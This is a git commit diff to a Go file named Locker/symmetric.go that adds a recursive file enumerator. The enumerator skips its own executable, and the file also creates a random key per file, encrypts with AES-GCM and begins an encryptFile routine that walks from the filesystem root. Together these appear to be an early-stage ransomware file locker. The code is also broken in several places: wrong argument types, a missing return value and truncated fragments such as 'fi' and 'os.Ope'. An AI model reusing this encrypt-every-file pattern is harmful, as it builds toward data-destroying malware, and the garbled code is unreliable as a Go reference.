11822d31872f4c7cf64aac03332e035879c2e2a1
obehi.iredia@gmail.com <obehi.iredia@gmail.com>
2020-05-25 23:56:05 -0400

    Work on WalkFunc

--- Locker/symmetric.go
+++ Locker/symmetric.go
@@ -9,6 +9,28 @@ import (
 	"io"
 )
 
+/* Walker function is used to enumerate each file in each
+   directory recurively. */
+func Walker(files *[]string) filepath.WalkFunc {
+	filepath.Walk(files, func(path string, info os.FileInfo, err error) error {
+		if err != nil {
+			fmt.Println(err)
+		}
+		if info.IsDir() {
+			return nil
+		}
+		exe, err := os.Executable()
+		if err != nil {
+			panic(err)
+		}
+		if path == exe {
+			return nil
+		}
+		*files = append(*files, path)
+		return nil				
+	}
+}
+
 /* keyGen function generates random 32 byte 
    key for each file that is encrypted */
 func keyGen() *[]byte {
@@ -34,19 +56,24 @@ func encrypt(data []byte, key []byte) (*[]byte, error) {
 	if err != nil {
 		return nil, err
 	}
-	// NONCE/IV initialization.
+	/* Initilization of the of number once used. Though,
+	   I am using rand.Read the nonce does not need to be random
+	   if it is random there is a chance it can be reused, but each
+	   key will be random. */ 
 	nonce := make([]byte, gcm.NonceSize())
 	if _, err := io.ReadFull(rand.Read, nonce); err != nil {
 		return nil, err
 	}
-    // Cipher text with nonce applied
+	/* Adding the nonce to the cipher text. The same nonce
+	   will be needed for decryption. Encrypted data will 
+	   be added to the nonce. */
 	cipherText := gcm.Seal(nonce, nonce, data, nil)
-	return &cipherText, nil
+	return &cipherText
 
 }
 
 func encryptFile(path string, key []byte) (*[]byte, error) {
-	fi
+	file, err := os.Ope
        err := filepath.Walk("/", func(path string, info os.FileInfo, err error) error {
 		   if err != nil {
 			   fmt.Println(err)
